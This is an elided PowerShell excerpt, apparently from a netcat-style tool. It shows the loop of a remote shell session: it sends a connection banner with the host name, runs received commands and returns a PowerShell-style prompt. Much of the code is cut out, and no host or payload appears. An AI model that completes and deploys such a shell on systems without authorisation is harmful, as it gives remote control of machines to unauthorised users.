...
function Main_Powershell
{
    ...
    try
    {
        ...
        try
        {
            $RemoteHostName = (Invoke-Command -ScriptBlock { hostname })
            $IntroPrompt = $Encoding.GetBytes("`n`n Connected to $RemoteHostName `n`n Hit Enter to continue... `n`n")
            $CommandToExecute = ""      
            $Data = $null
        }
        catch
        ...
        Start-Sleep -Milliseconds 10
            try
            {
                ...
                if($CommandToExecute -ne "")
                {
                    ...
                    $Prompt = $Encoding.GetBytes(("[$RemoteHostName] PS " + (pwd).Path + "> "))
                }
                $Data += $IntroPrompt
                $IntroPrompt = $null
                $Data += $ReturnedData
            ...
            try
            {
                ...
                if($Data.Length -eq 0){Start-Sleep -Milliseconds 200}
